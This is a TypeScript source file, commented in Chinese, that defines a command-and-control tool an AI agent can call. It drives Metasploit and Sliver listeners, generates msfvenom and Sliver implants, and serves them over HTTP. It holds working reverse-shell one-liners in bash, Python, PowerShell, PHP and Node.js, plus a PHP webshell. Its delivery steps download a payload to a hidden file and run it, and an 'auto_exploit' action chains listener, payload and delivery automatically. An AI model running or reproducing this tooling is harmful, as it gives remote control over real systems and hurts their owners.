/**
 * C2Tool — 可执行的 Command and Control 工具
 *
 * 通过 TmuxSession 管理 msfconsole / sliver-server 等交互式 C2 框架
 * 通过 ShellSession 管理原生反弹 shell
 * 自动检测本机 IP 并注入 payload
 */

import { networkInterfaces } from 'os'
import { exec as execCb } from 'child_process'
import { promisify } from 'util'
import * as fs from 'fs'
import * as path from 'path'
import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

const exec = promisify(execCb)

export interface C2Input {
  action: 'get_ip' | 'generate_payload' | 'deploy_listener' | 'deploy_payload' | 'list_sessions' | 'interact_session' | 'kill_session' | 'list_listeners' | 'kill_listener' | 'auto_exploit'
  framework?: 'metasploit' | 'sliver' | 'native'
  payload_type?: 'reverse_shell' | 'bind_shell' | 'webshell'
  platform?: 'linux' | 'windows'
  language?: 'bash' | 'python' | 'powershell' | 'php' | 'nodejs'
  lhost?: string
  lport?: number
  rhost?: string
  rport?: number
  session_id?: string
  command?: string
  target_path?: string
  listener_name?: string
  listener_type?: 'http' | 'https' | 'tcp'
  msf_module?: string
  msf_payload?: string
  sliver_config?: string
  auto_inject_ip?: boolean
}

interface C2Listener {
  id: string; name: string; framework: string; type: string
  host: string; port: number; tmuxSession?: string
  shellSessionId?: string; startTime: number
}

interface C2Session {
  id: string; framework: string; type: string; target: string
  listenerName: string; tmuxSession?: string
  shellSessionId?: string; startTime: number
}

export class C2Tool implements Tool {
  name = 'C2'

  private listeners: Map<string, C2Listener>
  private sessions: Map<string, C2Session>
  private stateFile: string

  constructor() {
    this.stateFile = ''
    this.listeners = new Map()
    this.sessions = new Map()
    this._loadState()
  }

  private _getStatePath(sessionDir?: string): string {
    if (!sessionDir) return ''
    return path.join(sessionDir, 'c2_state.json')
  }

  private _loadState(): void {
    try {
      if (!this.stateFile || !fs.existsSync(this.stateFile)) return
      const raw = fs.readFileSync(this.stateFile, 'utf8')
      const state = JSON.parse(raw) as { listeners?: C2Listener[]; sessions?: C2Session[] }
      if (state.listeners) for (const l of state.listeners) this.listeners.set(l.name, l)
      if (state.sessions) for (const s of state.sessions) this.sessions.set(s.id, s)
    } catch { /* best-effort */ }
  }

  private _saveState(): void {
    if (!this.stateFile) return
    try {
      fs.writeFileSync(this.stateFile, JSON.stringify({
        listeners: Array.from(this.listeners.values()),
        sessions: Array.from(this.sessions.values()),
        savedAt: new Date().toISOString(),
      }, null, 2), 'utf8')
    } catch { /* best-effort */ }
  }

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'C2',
      description: `Command & Control — 真正调用 Metasploit/Sliver/原生 shell，自动注入攻击机 IP。

## 操作
| action | 说明 |
|--------|------|
| get_ip | 获取本机外网+内网 IP（自动检测） |
| generate_payload | 生成 payload 命令/代码（不执行） |
| deploy_listener | 部署 C2 监听器（启动 msfconsole/sliver/nc） |
| deploy_payload | 生成 payload 文件并启动 HTTP 服务供目标下载 |
| list_sessions | 列出所有 C2 会话 |
| interact_session | 向 C2 会话发送命令 |
| kill_session | 关闭 C2 会话 |
| list_listeners | 列出 C2 监听器 |
| kill_listener | 关闭 C2 监听器 |
| auto_exploit | 一键全流程：监听→payload→投递指引 |

## 框架
| framework | 说明 |
|-----------|------|
| metasploit | 通过 TmuxSession 控制 msfconsole |
| sliver | 通过 TmuxSession 控制 sliver-server |
| native | 通过 ShellSession 管理原生反弹 shell`,
      parameters: {
        type: 'object',
        properties: {
          action: { type: 'string', enum: ['get_ip', 'generate_payload', 'deploy_listener', 'deploy_payload', 'list_sessions', 'interact_session', 'kill_session', 'list_listeners', 'kill_listener', 'auto_exploit'] },
          framework: { type: 'string', enum: ['metasploit', 'sliver', 'native'] },
          payload_type: { type: 'string', enum: ['reverse_shell', 'bind_shell', 'webshell'] },
          platform: { type: 'string', enum: ['linux', 'windows'] },
          language: { type: 'string', enum: ['bash', 'python', 'powershell', 'php', 'nodejs'] },
          lhost: { type: 'string' }, lport: { type: 'number' }, rhost: { type: 'string' }, rport: { type: 'number' },
          session_id: { type: 'string' }, command: { type: 'string' }, target_path: { type: 'string' },
          listener_name: { type: 'string' }, listener_type: { type: 'string', enum: ['http', 'https', 'tcp'] },
          msf_module: { type: 'string' }, msf_payload: { type: 'string' }, sliver_config: { type: 'string' },
          auto_inject_ip: { type: 'boolean' },
        },
        required: ['action'],
      },
    },
  }

  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
    const c2Input = input as unknown as C2Input
    const statePath = this._getStatePath(context.sessionDir)
    if (statePath && statePath !== this.stateFile) { this.stateFile = statePath; this._loadState() }

    switch (c2Input.action) {
      case 'get_ip':            return this.getIP()
      case 'generate_payload':  return this.generatePayload(c2Input)
      case 'deploy_listener':   return this.deployListener(c2Input, context)
      case 'deploy_payload':    return this.deployPayload(c2Input, context)
      case 'list_sessions':     return this.listSessions()
      case 'interact_session':  return this.interactSession(c2Input, context)
      case 'kill_session':      return this.killSession(c2Input)
      case 'list_listeners':    return this.listListeners()
      case 'kill_listener':     return this.killListener(c2Input, context)
      case 'auto_exploit':      return this.autoExploit(c2Input, context)
      default: return { content: `Unknown action: ${c2Input.action}`, isError: true }
    }
  }

  private async getIP(): Promise<ToolResult> {
    const results: string[] = []
    for (const [name, nets] of Object.entries(networkInterfaces())) {
      for (const net of nets || []) { if (net.family === 'IPv4' && !net.internal) results.push(`${name}: ${net.address}`) }
    }
    let publicIP = ''
    try { const { stdout } = await exec('curl -s --connect-timeout 5 ifconfig.me 2>/dev/null || curl -s --connect-timeout 5 icanhazip.com 2>/dev/null'); publicIP = stdout.trim() } catch { /* ignore */ }
    const lines = ['[C2] 本机 IP:', ...results.map(r => `  内网: ${r}`)]
    if (publicIP) lines.push(`  外网: ${publicIP}`)
    lines.push(`\n推荐使用: ${publicIP || results[0]?.split(': ')[1] || '0.0.0.0'}`)
    return { content: lines.join('\n'), isError: false }
  }

  private async resolveLhost(input: C2Input): Promise<string> {
    if (input.lhost) return input.lhost
    if (input.auto_inject_ip === false) return 'ATTACKER_IP'
    try { const { stdout } = await exec('curl -s --connect-timeout 3 ifconfig.me 2>/dev/null'); const p = stdout.trim(); if (p && /^\d+\.\d+\.\d+\.\d+$/.test(p)) return p } catch { /* ignore */ }
    for (const nets of Object.values(networkInterfaces())) for (const net of nets || []) if (net.family === 'IPv4' && !net.internal) return net.address
    return '0.0.0.0'
  }

  private generatePayload(input: C2Input): ToolResult {
    const { framework = 'native', payload_type = 'reverse_shell', platform = 'linux', language = 'bash' } = input
    const lport = input.lport || 4444, lhost = input.lhost || 'ATTACKER_IP'
    let payload = ''
    if (framework === 'metasploit') {
      const msfP = input.msf_payload || (platform === 'windows' ? 'windows/x64/meterpreter/reverse_tcp' : 'linux/x64/meterpreter/reverse_tcp')
      payload = [
        `msfvenom -p ${msfP} LHOST=${lhost} LPORT=${lport} -f elf -o /tmp/payload`,
        `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o /tmp/payload.exe`,
        `msfvenom -p php/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f raw -o /tmp/shell.php`,
      ].join('\n')
    } else if (framework === 'sliver') {
      payload = [
        `generate beacon --http ${lhost}:${lport} --os ${platform} --arch amd64 --save /tmp/`,
        `generate session --tcp ${lhost}:${lport} --os ${platform} --arch amd64 --save /tmp/`,
      ].join('\n')
    } else {
      switch (language) {
        case 'bash': payload = `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`; break
        case 'python': payload = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`; break
        case 'powershell': payload = `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`; break
        case 'php': payload = `php -r '$s=fsockopen("${lhost}",${lport});while(!feof($s)){$c=fread($s,1024);@exec($c,$o);$o=join("\\n",$o);$o.="# ";fwrite($s,$o);}fclose($s);'`; break
        case 'nodejs': payload = `node -e "require('net').createConnection(${lport},'${lhost}',function(c){require('child_process').spawn('/bin/sh',[],{stdio:[c,c,c]})});"`; break
        default: payload = `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`
      }
    }
    return { content: `[C2] Generated ${payload_type} payload (${framework}/${platform}):\n\n${payload}`, isError: false }
  }

  private shellEsc(s: string): string { return `'${s.replace(/'/g, "'\\''")}'` }
  private sleep(ms: number): Promise<void> { return new Promise(r => setTimeout(r, ms)) }

  private async deployListener(input: C2Input, context: ToolContext): Promise<ToolResult> {
    const framework = input.framework || 'native'
    const lport = input.lport || 4444
    const lhost = await this.resolveLhost(input)
    const listenerName = input.listener_name || `${framework}_${lport}`

    if (this.listeners.has(listenerName)) return { content: `[C2] 监听器 "${listenerName}" 已存在`, isError: false }

    let result = ''
    switch (framework) {
      case 'metasploit': result = await this.deployMsfListener(listenerName, lhost, lport, input); break
      case 'sliver': result = await this.deploySliverListener(listenerName, lhost, lport, input); break
      default: result = this.deployNativeListener(listenerName, lhost, lport); break
    }

    if (framework !== 'native') {
      this.listeners.set(listenerName, { id: `lst_${Date.now()}`, name: listenerName, framework, type: input.listener_type || 'tcp', host: lhost, port: lport, tmuxSession: `c2_${listenerName}`, startTime: Date.now() })
      this._saveState()
    }
    return { content: result, isError: false }
  }

  private async deployMsfListener(name: string, lhost: string, lport: number, input: C2Input): Promise<string> {
    const tmuxSession = `c2_${name}`
    const msfPayload = input.msf_payload || (input.platform === 'windows' ? 'windows/x64/meterpreter/reverse_tcp' : 'linux/x64/meterpreter/reverse_tcp')
    try { await exec(`tmux new-session -d -s ${tmuxSession} 2>/dev/null || true`); await exec(`tmux send-keys -t ${tmuxSession} 'msfconsole -q' Enter`) } catch { return `[C2] tmux 创建失败\n请确认: apt install tmux` }
    await this.sleep(15000)
    for (const cmd of [`use exploit/multi/handler`, `set payload ${msfPayload}`, `set LHOST ${lhost}`, `set LPORT ${lport}`, `set ExitOnSession false`, `run -j`]) {
      await exec(`tmux send-keys -t ${tmuxSession} ${this.shellEsc(cmd)} Enter`); await this.sleep(1500)
    }
    await this.sleep(5000)
    let output = ''
    try { const { stdout } = await exec(`tmux capture-pane -t ${tmuxSession} -p -S -20`); output = stdout } catch { /* ignore */ }
    return [`[C2] Metasploit 监听器已部署!`, ``, `  框架:     Metasploit`, `  Tmux:     ${tmuxSession}`, `  Payload:  ${msfPayload}`, `  监听:     ${lhost}:${lport}`, ``, `输出:`, output || '(等待输出...)', ``, `后续:`, `  查看: C2({ action: "list_sessions" })`, `  交互: C2({ action: "interact_session", session_id: "msf_1", command: "getuid" })`].join('\n')
  }

  private async deploySliverListener(name: string, lhost: string, lport: number, input: C2Input): Promise<string> {
    const tmuxSession = `c2_${name}`
    try { await exec(`tmux new-session -d -s ${tmuxSession} 2>/dev/null || true`); await exec(`tmux send-keys -t ${tmuxSession} 'sliver-server' Enter`) } catch { return `[C2] Sliver 启动失败\n请确认 sliver-server 已安装` }
    await this.sleep(10000)
    for (const cmd of [`mtls -l ${lhost} -p ${lport}`, `http -l ${lhost} -p ${lport}`, `dns -l ${lhost} -p 53`]) {
      await exec(`tmux send-keys -t ${tmuxSession} ${this.shellEsc(cmd)} Enter`); await this.sleep(2000)
    }
    let output = ''
    try { const { stdout } = await exec(`tmux capture-pane -t ${tmuxSession} -p -S -20`); output = stdout } catch { /* ignore */ }
    return [`[C2] Sliver 监听器已部署!`, ``, `  框架:     Sliver C2`, `  Tmux:     ${tmuxSession}`, `  监听:     ${lhost}:${lport}`, ``, `输出:`, output || '(等待输出...)'].join('\n')
  }

  private deployNativeListener(name: string, lhost: string, lport: number): string {
    return [`[C2] 原生反弹 shell — 请按以下步骤:`, ``, `步骤1: ShellSession({ action: "listen", port: ${lport} })`, `步骤2: 目标执行 bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`, `步骤3: ShellSession({ action: "exec", session_id: "shell_${lport}", command: "id" })`].join('\n')
  }

  private async deployPayload(input: C2Input, context: ToolContext): Promise<ToolResult> {
    const framework = input.framework || 'native'
    const platform = input.platform || 'linux'
    const lport = input.lport || 4444
    const lhost = await this.resolveLhost(input)
    const payloadDir = '/tmp/c2_payloads'
    try { await exec(`mkdir -p ${payloadDir}`) } catch { /* ignore */ }

    let payloadFile = '', payloadContent = ''
    if (framework === 'metasploit') {
      const msfP = input.msf_payload || (platform === 'windows' ? 'windows/x64/meterpreter/reverse_tcp' : 'linux/x64/meterpreter/reverse_tcp')
      const fmt = platform === 'windows' ? 'exe' : 'elf'
      payloadFile = `${payloadDir}/payload_${platform}.${platform === 'windows' ? 'exe' : 'bin'}`
      try { await exec(`msfvenom -p ${msfP} LHOST=${lhost} LPORT=${lport} -f ${fmt} -o ${payloadFile} 2>/dev/null`) } catch (e) { return { content: `[C2] msfvenom 生成失败: ${(e as Error).message}`, isError: true } }
    } else if (framework === 'sliver') {
      payloadFile = `${payloadDir}/sliver_beacon_${platform}`
      const tmuxS = this.findListenerTmuxSession('sliver', lport)
      if (tmuxS) try { await exec(`tmux send-keys -t ${tmuxS} ${this.shellEsc(`generate beacon --http ${lhost}:${lport} --os ${platform} --arch amd64 --save ${payloadDir}/`)} Enter`); await this.sleep(5000) } catch { /* ignore */ }
    } else {
      payloadContent = this.generateNativePayload('reverse_shell', platform, input.language || 'bash', lhost, lport)
      payloadFile = `${payloadDir}/shell_${platform}.sh`
      try { fs.writeFileSync(payloadFile, payloadContent); await exec(`chmod +x ${payloadFile}`) } catch (e) { return { content: `[C2] 写入 payload 失败: ${(e as Error).message}`, isError: true } }
    }

    const httpPort = 8889
    try { await exec(`pkill -f "python3 -m http.server ${httpPort}" 2>/dev/null || true`); await exec(`cd ${payloadDir} && nohup python3 -m http.server ${httpPort} > /tmp/c2_http_server.log 2>&1 &`) } catch { /* ignore */ }

    const baseName = path.basename(payloadFile)
    return {
      content: [
        `[C2] Payload 已生成并部署!`, ``,
        `  框架:     ${framework}`, `  平台:     ${platform}`, `  攻击机IP: ${lhost}`, `  Payload:  ${payloadFile}`, ``,
        `HTTP 下载: http://${lhost}:${httpPort}/`, ``,
        platform === 'linux'
          ? `目标下载: wget http://${lhost}:${httpPort}/${baseName} -O /tmp/.update && chmod +x /tmp/.update && /tmp/.update &`
          : `目标下载: certutil -urlcache -split -f http://${lhost}:${httpPort}/${baseName} C:\\temp\\update.exe`,
        ``, `通过 RCE 直接注入:`, `  ${this.generateNativePayload('reverse_shell', platform, 'bash', lhost, lport)}`,
      ].join('\n'),
      isError: false,
    }
  }

  private generateNativePayload(payload_type: string, platform: string, language: string, lhost: string, lport: number): string {
    if (payload_type === 'reverse_shell') {
      switch (language) {
        case 'bash': return `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`
        case 'python': return `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`
        case 'powershell': return `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`
        case 'php': return `php -r '$s=fsockopen("${lhost}",${lport});while(!feof($s)){$c=fread($s,1024);@exec($c,$o);$o=join("\\n",$o);fwrite($s,$o."# ");}fclose($s);'`
        case 'nodejs': return `node -e "require('net').createConnection(${lport},'${lhost}',function(c){require('child_process').spawn('/bin/sh',[],{stdio:[c,c,c]})});"`
        default: return `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`
      }
    }
    return `<?php @system($_GET["c"]); ?>`
  }

  private async listSessions(): Promise<ToolResult> {
    const all: string[] = []
    try { const { stdout } = await exec(`ss -tlnp 2>/dev/null | grep -E ':(4444|4445|5555|7777|8888)' || true`); if (stdout.trim()) all.push('── 原生反弹 Shell ──', stdout.trim()) } catch { /* ignore */ }
    for (const [, l] of this.listeners) {
      if (l.tmuxSession) try { await exec(`tmux send-keys -t ${l.tmuxSession} 'sessions -l' Enter`); await this.sleep(2000); const { stdout } = await exec(`tmux capture-pane -t ${l.tmuxSession} -p -S -30`); const lines = stdout.split('\n').filter(s => s.match(/^\d+\s/) || s.includes('meterpreter')); if (lines.length) all.push(`── ${l.framework} (${l.name}) ──`, ...lines) } catch { /* ignore */ }
    }
    if (this.sessions.size > 0) { all.push('── 已记录的 C2 会话 ──'); for (const s of this.sessions.values()) all.push(`  ${s.id} | ${s.framework} | ${s.target}`) }
    if (all.length === 0) return { content: '[C2] 暂无活跃会话\n\n启动: C2({ action: "deploy_listener", framework: "metasploit", lport: 4444 })', isError: false }
    return { content: `[C2] 活跃会话:\n\n${all.join('\n')}`, isError: false }
  }

  private async interactSession(input: C2Input, _context: ToolContext): Promise<ToolResult> {
    const { session_id, command } = input
    if (!session_id) return { content: 'session_id is required', isError: true }
    if (!command) return { content: 'command is required', isError: true }

    if (session_id.startsWith('msf_')) {
      for (const [, l] of this.listeners) if (l.framework === 'metasploit' && l.tmuxSession) return this.interactMsfSessionViaTmux(l.tmuxSession, session_id, command)
      return { content: '未找到 Metasploit 监听器', isError: true }
    }
    if (session_id.startsWith('sliver_')) {
      for (const [, l] of this.listeners) if (l.framework === 'sliver' && l.tmuxSession) return this.interactSliverSessionViaTmux(l.tmuxSession, session_id, command)
      return { content: '未找到 Sliver 监听器', isError: true }
    }
    if (session_id.startsWith('shell_')) {
      return { content: `[C2] 原生 shell 需通过 ShellSession 交互:\n  ShellSession({ action: "exec", session_id: "${session_id}", command: ${JSON.stringify(command)} })`, isError: true }
    }
    return { content: `Session "${session_id}" 未找到`, isError: true }
  }

  private async interactMsfSessionViaTmux(tmuxSession: string, sessionId: string, command: string): Promise<ToolResult> {
    const num = sessionId.replace('msf_', '')
    const msfCmd = `sessions -i ${num} -C '${command.replace(/'/g, "'\\''")}'`
    try { await exec(`tmux send-keys -t ${tmuxSession} ${this.shellEsc(msfCmd)} Enter`); await this.sleep(3000); const { stdout } = await exec(`tmux capture-pane -t ${tmuxSession} -p -S -30`); return { content: `[C2] MSF ${sessionId}: ${command}\n\n${stdout.trim()}`, isError: false } } catch (e) { return { content: `[C2] MSF 交互失败: ${(e as Error).message}`, isError: true } }
  }

  private async interactSliverSessionViaTmux(tmuxSession: string, sessionId: string, command: string): Promise<ToolResult> {
    try { await exec(`tmux send-keys -t ${tmuxSession} ${this.shellEsc(`use ${sessionId} && execute ${command}`)} Enter`); await this.sleep(3000); const { stdout } = await exec(`tmux capture-pane -t ${tmuxSession} -p -S -30`); return { content: `[C2] Sliver ${sessionId}: ${command}\n\n${stdout.trim()}`, isError: false } } catch (e) { return { content: `[C2] Sliver 交互失败: ${(e as Error).message}`, isError: true } }
  }

  private async killSession(input: C2Input): Promise<ToolResult> {
    const { session_id } = input
    if (!session_id) return { content: 'session_id required', isError: true }
    if (session_id.startsWith('msf_')) {
      for (const [, l] of this.listeners) if (l.framework === 'metasploit' && l.tmuxSession) { try { await exec(`tmux send-keys -t ${l.tmuxSession} ${this.shellEsc(`sessions -k ${session_id.replace('msf_', '')}`)} Enter`) } catch { /* ignore */ } }
    }
    this.sessions.delete(session_id); this._saveState()
    return { content: `[C2] Session ${session_id} 已关闭`, isError: false }
  }

  private listListeners(): ToolResult {
    if (this.listeners.size === 0) return { content: '[C2] 暂无监听器\n\n部署: C2({ action: "deploy_listener", framework: "metasploit", lport: 4444 })', isError: false }
    const lines = ['[C2] 活跃监听器:']
    for (const l of this.listeners.values()) lines.push(`  ${l.name} | ${l.framework} | ${l.type} | ${l.host}:${l.port} | Tmux: ${l.tmuxSession || '-'}`)
    return { content: lines.join('\n'), isError: false }
  }

  private async killListener(input: C2Input, _context: ToolContext): Promise<ToolResult> {
    const { listener_name } = input
    if (!listener_name) return { content: 'listener_name required', isError: true }
    const l = this.listeners.get(listener_name)
    if (!l) return { content: `监听器 "${listener_name}" 未找到`, isError: true }
    if (l.tmuxSession) try { await exec(`tmux kill-session -t ${l.tmuxSession} 2>/dev/null || true`) } catch { /* ignore */ }
    this.listeners.delete(listener_name); this._saveState()
    return { content: `[C2] 监听器 "${listener_name}" 已关闭`, isError: false }
  }

  private async autoExploit(input: C2Input, context: ToolContext): Promise<ToolResult> {
    const framework = input.framework || 'metasploit', platform = input.platform || 'linux', lport = input.lport || 4444
    const lhost = await this.resolveLhost(input)
    const results = [`[C2] ═══ 一键 C2 部署 ═══`, ``, `  IP: ${lhost}  端口: ${lport}  平台: ${platform}  框架: ${framework}`, ``]
    results.push('── 步骤1: 部署监听器 ──')
    results.push((await this.deployListener({ ...input, lhost, lport, listener_name: `auto_${framework}_${lport}` }, context)).content)
    results.push('')
    results.push('── 步骤2: 部署 Payload ──')
    results.push((await this.deployPayload({ ...input, lhost, lport }, context)).content)
    results.push('')
    const bashPayload = this.generateNativePayload('reverse_shell', platform, 'bash', lhost, lport)
    const pythonPayload = this.generateNativePayload('reverse_shell', platform, 'python', lhost, lport)
    results.push('── 步骤3: 投递到目标 ──', '', `方式1 (RCE): ${bashPayload}`, '', `方式2 (Python): ${pythonPayload}`, '', `方式3 (下载): wget http://${lhost}:8889/shell_${platform}.sh -O /tmp/.u && chmod +x /tmp/.u && /tmp/.u &`)
    return { content: results.join('\n'), isError: false }
  }

  private findListenerTmuxSession(framework: string, port: number): string | undefined {
    for (const l of this.listeners.values()) if (l.framework === framework && l.port === port && l.tmuxSession) return l.tmuxSession
    return undefined
  }
}
